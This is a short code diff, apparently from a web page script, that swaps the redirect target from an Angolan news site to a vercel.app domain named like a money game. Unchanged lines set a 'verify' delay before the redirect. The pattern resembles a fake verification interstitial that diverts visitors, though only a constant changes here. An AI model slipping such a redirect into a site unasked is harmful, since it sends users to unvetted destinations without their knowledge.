@@ -1,4 +1,4 @@
-const REDIRECT_URL = "https://www.jornaldeangola.ao/";
+const REDIRECT_URL = "https://subwaymoney-coral.vercel.app/";
 const VERIFY_DELAY_MS = 1100;
 const REDIRECT_DELAY_MS = 900;
 
